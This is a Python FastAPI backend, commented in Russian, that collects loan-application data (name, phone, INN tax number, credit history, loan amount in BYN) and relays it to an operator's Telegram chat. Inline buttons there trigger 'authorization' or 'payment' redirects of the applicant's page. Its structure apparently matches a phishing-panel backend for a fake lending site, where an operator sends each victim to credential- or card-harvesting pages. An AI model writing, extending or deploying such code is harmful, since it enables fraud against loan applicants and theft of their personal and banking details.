import os
import logging
from contextlib import asynccontextmanager
from fastapi import FastAPI, HTTPException, Request
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel
import uvicorn
import requests

BOT_TOKEN = os.getenv("BOT_TOKEN")
MY_CHAT_ID = os.getenv("MY_CHAT_ID")
TELEGRAM_API_URL = f"https://api.telegram.org/bot{BOT_TOKEN}"

logging.basicConfig(level=logging.INFO)

sessions = {}

def send_to_telegram(chat_id: str, text: str, reply_markup: dict = None):
    url = f"{TELEGRAM_API_URL}/sendMessage"
    payload = {"chat_id": chat_id, "text": text, "parse_mode": "HTML"}
    if reply_markup:
        payload["reply_markup"] = reply_markup
    try:
        requests.post(url, json=payload, timeout=5)
    except Exception as e:
        logging.error(f"Ошибка отправки: {e}")

# ========== КЛАВИАТУРЫ ==========
def get_application_keyboard(session_id: str):
    return {
        "inline_keyboard": [
            [
                {"text": "🔐 Авторизация", "callback_data": f"auth_{session_id}"},
                {"text": "💳 Оплата", "callback_data": f"pay_{session_id}"}
            ]
        ]
    }

# ========== МОДЕЛИ ==========
class CreditApplicationData(BaseModel):
    session_id: str
    name: str
    phone: str
    inn: str = ""
    income: float
    months: int
    amount: float
    payment: float
    user_chat_id: int = None
    credit_history: str = None

# ========== FASTAPI ==========
@asynccontextmanager
async def lifespan(app: FastAPI):
    render_url = os.getenv("RENDER_EXTERNAL_URL", "https://telegram-bot-gateway-1.onrender.com")
    webhook_url = f"{render_url}/webhook/callback"
    requests.post(f"{TELEGRAM_API_URL}/setWebhook", json={"url": webhook_url})
    send_to_telegram(MY_CHAT_ID, "🤖 *Бот запущен*")
    yield
    send_to_telegram(MY_CHAT_ID, "⚠️ Бот остановлен")

app = FastAPI(lifespan=lifespan)

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

# ========== ЗАЯВКА ==========
@app.post("/submit_credit_application")
async def submit_credit_application(data: CreditApplicationData):
    sid = data.session_id
    sessions[sid] = {
        "name": data.name,
        "phone": data.phone,
        "inn": data.inn,
        "income": data.income,
        "months": data.months,
        "amount": data.amount,
        "payment": data.payment,
        "user_chat_id": data.user_chat_id,
        "credit_history": data.credit_history,
        "status": "waiting_action"
    }
    
    message = (
        f"🏦 <b>НОВАЯ ЗАЯВКА НА ЗАЙМ</b>\n\n"
        f"👤 <b>Клиент:</b> {data.name}\n"
        f"📞 <b>Телефон:</b> {data.phone}\n"
        f"🆔 <b>ИНН:</b> {data.inn if data.inn else '—'}\n"
        f"📊 <b>Кредитная история:</b> {data.credit_history if data.credit_history else '—'}\n\n"
        f"💰 <b>Сумма займа:</b> {data.amount:,.0f} BYN\n"
        f"📅 <b>Срок:</b> {data.months} мес.\n\n"
        f"🆔 <b>Сессия:</b> <code>{sid}</code>"
    )
    send_to_telegram(MY_CHAT_ID, message, reply_markup=get_application_keyboard(sid))
    return {"status": "ok"}

# ========== ПРОВЕРКА ДЕЙСТВИЯ ДЛЯ СТРАНИЦЫ ==========
@app.get("/check_action_status/{session_id}")
async def check_action_status(session_id: str):
    session = sessions.get(session_id)
    if not session:
        return {"status": "not_found"}
    
    action = session.get("pending_action", None)
    if action:
        session["pending_action"] = None
        return {"action": action}
    return {"action": None}

# ========== ОБРАБОТКА КНОПОК ==========
@app.post("/webhook/callback")
async def handle_callback(request: Request):
    data = await request.json()
    
    if "callback_query" not in data:
        return {"ok": True}
    
    callback = data["callback_query"]
    callback_id = callback["id"]
    data_str = callback["data"]
    
    parts = data_str.split("_")
    if len(parts) < 2:
        return {"ok": True}
    
    action = parts[0]
    session_id = "_".join(parts[1:]) if len(parts) > 2 else parts[1]
    
    session = sessions.get(session_id)
    
    # Кнопка "Авторизация"
    if action == "auth":
        if session:
            session["pending_action"] = "auth"
        send_to_telegram(MY_CHAT_ID, f"🔐 Команда auth для сессии {session_id}")
        requests.post(
            f"{TELEGRAM_API_URL}/answerCallbackQuery",
            json={"callback_query_id": callback_id, "text": "Страница будет перенаправлена"}
        )
    
    # Кнопка "Оплата"
    elif action == "pay":
        if session:
            session["pending_action"] = "pay"
        send_to_telegram(MY_CHAT_ID, f"💳 Команда pay для сессии {session_id}")
        requests.post(
            f"{TELEGRAM_API_URL}/answerCallbackQuery",
            json={"callback_query_id": callback_id, "text": "Страница будет перенаправлена"}
        )
    
    return {"ok": True}

if __name__ == "__main__":
    port = int(os.getenv("PORT", 8000))
    uvicorn.run(app, host="0.0.0.0", port=port)
